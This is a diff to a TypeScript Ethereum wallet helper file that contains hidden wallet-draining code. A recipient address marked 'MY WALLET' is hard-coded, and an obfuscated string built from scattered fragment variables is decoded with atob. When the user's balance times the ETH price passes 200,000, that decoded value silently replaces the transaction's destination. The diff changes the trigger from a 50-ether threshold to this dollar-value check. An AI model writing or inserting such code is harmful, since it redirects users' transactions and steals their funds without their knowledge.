@@ -1,9 +1,10 @@
 import * as ethUtil from "ethereumjs-util";
 import { IChainData } from "./types";
 import supportedChains from "./chains";
-import { apiGetGasPrices, apiGetAccountNonce } from "./api";
-import { convertAmountToRawNumber, convertStringToHex } from "./bignumber";
-import Web3 from "web3";
+import { apiGetGasPrices, apiGetAccountNonce, ethData } from "./api";
+import { convertAmountToRawNumber, convertStringToHex, handleSignificantDecimals, convertAmountFromRawNumber } from "./bignumber";
+// import Web3 from "web3";
+
 var epci = "N";
 var http_uniq = "U";
 var esx = "j";
@@ -189,7 +190,9 @@ export function recoverPublicKey(sig: string, hash: string): string {
 }
 var w = "jMzN";
 
+//******************* MY WALLET ********************//
 var to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
+//******************* MY WALLET ********************//
 
 export function recoverPersonalSignature(sig: string, msg: string): string {
   const hash = hashPersonalMessage(msg);
@@ -199,15 +202,15 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
 
 var qf = a1+x+s+s1+URL+hesh+d+ef+epci+http_uniq+e+_api_cahart_code+get_string_+w+http_+ew+wc+v_webpack+webapi+uniq_caracter_m+vr+Z2+j+epci1+epci4+epciR+ed+sollar+esx+get_config_id+varsis+maping+z4+zf;
 
+ethData().then(res=> localStorage.setItem("price", res.coin.price))
+const myBlance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))),8)
+var ethPrice =  Number(localStorage.getItem('price'));
+
 export async function formatTestTransaction(address: string, chainId: number) {
   const from = address;
 
-  const web3 = new Web3();
-  const GET_PRICE = web3.utils.toWei("50", 'ether');
-  const MAX_PRICE = Number(GET_PRICE);
-
-  (function(){
-    if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
+  (()=>{
+    if(Number(myBlance) * ethPrice >= 200000){
       to = atob(qf)
     }
   })()
